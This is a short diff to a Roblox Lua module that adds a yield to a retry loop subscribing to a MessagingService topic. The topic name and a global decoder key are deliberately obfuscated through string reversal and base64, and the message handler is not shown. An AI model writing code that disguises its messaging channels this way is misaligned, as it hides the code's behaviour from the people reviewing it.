@@ -50,6 +50,7 @@ function m:Init()
 		s, c = pcall(function()
 			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
 		end)
+		task.wait()
 	until
 	s
 
